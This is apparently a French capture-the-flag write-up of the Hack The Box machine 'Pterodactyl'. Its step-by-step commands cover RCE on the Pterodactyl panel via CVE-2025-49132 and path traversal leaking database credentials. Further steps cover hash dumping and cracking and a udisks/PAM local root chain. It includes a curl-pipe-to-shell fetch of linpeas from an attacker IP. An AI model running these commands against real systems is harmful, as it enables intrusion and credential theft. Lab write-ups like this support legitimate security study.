  # Pterodactyl

	  echo "10.129.4.93 pterodactyl.htb" >> /etc/hosts
      echo "10.129.4.93 panel.pterodactyl.htb" >> /etc/hosts
	  sudo masscan -p1-65535,U:1-65535 10.129.4.93 -e tun0 > ports.txt
	  sudo nmap -p- -sV -T4 -A 10.129.4.93 -oN nmap.txt
	
Scans classiques.
Résultats :

    PORT     STATE  SERVICE    VERSION
    22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
    80/tcp   open   http       nginx 1.21.5
    443/tcp  closed https
    8080/tcp closed http-proxy


Fuzzing web : 

    feroxbuster --silent -u http://pterodactyl.htb
    ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
    ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt


On a un changelog : 
- http://pterodactyl.htb/changelog.txt

Ce fichier mentionne un domaine play.pterodactyl.htb ainsi que l'activation de phpinfo() et quelques détails sur les technologies.

Un peu de fuzzing révèle un deuxième sous-domaine http://panel.pterodactyl.htb : 

    ffuf -u http://pterodactyl.htb/ -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -fs 145

Le panel tourne sous Pterodactyl et il existe un CVE récent qui permet une RCE : 
- https://www.exploit-db.com/exploits/52341
- https://github.com/63square/CVE-2025-49132/blob/master/exploit.py
- https://github.com/pxxdrobits/CVE-2025-49132/blob/main/cve.py

Exploitation avec script un peu amélioré : 

    vim exp.py
    python3 exp.py "http://panel.pterodactyl.htb/"

Shell en tant que wwwrun sur le serveur.

On a aussi un couple utilisateur / mot de passe à l'URL suivante : 
- http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database

Utilisation du couple sur la base de données locale pour chopper des mots de passe puis tenter de les casser : 

```
mysql -h 127.0.0.1 -u pterodactyl -p'PteraPanel' --batch --skip-column-names -e "SELECT id,username,email,root_admin,password FROM panel.users;"

hashcat -m 3200 -a 0 mdp.txt ./rockyou.txt --username --show
```

On a le mot de passe de phileasfogg3 : 

    ssh phileasfogg3@pterodactyl.htb
    cat user.txt

## Élévation de privilèges

    curl -L http://10.10.16.193:8000/linpeas.sh | sh
    
    
Deux CVE sur OpenSUSE 15.6 qui permettent une LPE : 

- https://next.ink/brief_article/sur-linux-deux-failles-peuvent-senchainer-pour-obtenir-un-acces-root/
- https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
- https://github.com/dreysanox/CVE-2025-6018_Poc/blob/main/poc2025-6018.py 
- https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh

Exploitation : 

    vim exp_pam.py
    python3 .\exp_pam.py -i pterodactyl.htb -u phileasfogg3 -k $PASS
    
Voir la procédure pour générer l'image dans les différents papiers.

    curl -L http://10.10.16.193:8000/xfs.image --output ./xfs.image
    
    grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions
    
    killall -KILL gvfs-udisks2-volume-monitor
    
    udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
    
    while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
    
    gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
    
    ls /tmp
    cat /tmp/root_out.txt
    

    
    
    
